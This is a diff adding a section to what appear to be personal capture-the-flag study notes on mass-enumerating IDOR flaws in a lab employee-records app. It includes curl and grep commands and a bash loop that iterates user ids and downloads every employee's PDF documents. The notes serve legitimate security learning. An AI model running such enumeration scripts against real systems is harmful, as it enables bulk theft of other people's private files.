@@ -352,3 +352,80 @@ the second user might not have all these API parameters to replicate the call, b
 these might work if the web app only requires a valid login session to make the API call and no backend verification of the caller's session and the requested data 
 
 in this case we can either identify the API parameters for other users or we still identify the backend access control vulnerability 
+
+## Mass IDOR Enumeration 
+
+some IDORs can be simple but for advanced IDORs we need to understand how the app works, how it calculates its object references, and how its access control system works 
+
+### Insecure parameters 
+
+if our target is an app that hosts employee records: 
+
+![](Images/Pasted%20image%2020240225172422.png)
+
+we can see that in a target like this we might have visible user ids or resources: 
+
+![](Images/Pasted%20image%2020240225172602.png)
+
+![](Images/Pasted%20image%2020240225172608.png)
+
+we might guess that the file names are using the userid and the month/year as part of the file name, which might let us fuzz for other files   
+this is a basic type of IDOR and is called `static file IDOR` 
+
+we can find that the page is setting our user id from a GET parameter like `documents.php?uid=1`   
+we can try to change this value and see if we don't get an access denied error  
+
+if we make the change and don't notice any difference, we need to pay attention to the page details and keep and eye on the source code and page size   
+for example we can look and see that changing to `uid=2` will result in different files 
+
+another example of this is instead of using the user id itself the app will user filters specific to the user like `uid_filter=1`   
+
+### Mass enumeration 
+
+we can first look at any of the links in the page to see their source code: 
+
+```html
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+we want to pick out a phrase like `<li class='pure-tree_link'>` to be able to grep for in our output from: 
+
+```shell-session
+curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
+```
+
+then we can further filter to only get the resource names: 
+
+```shell-session
+curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+```
+
+then for this example we can use a simple loop to go over the uid parameter and try to return all the employee documents: 
+
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+	for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+		wget -q $url/$link
+	done
+done
+```
+
+running this script will download all the employee documents from 1-10 and exploit the IDOR to mass enumerate the documents of all employees   
+
+we can do the same in burp by creating a list of employee numbers: 
+
+![](Images/Pasted%20image%2020240225174908.png)
+
+capturing the get document request: 
+
+![](Images/Pasted%20image%2020240225174924.png)
+
+then with the payload we can see an id that returns the flag: 
+
+![](Images/Pasted%20image%2020240225175031.png)
+
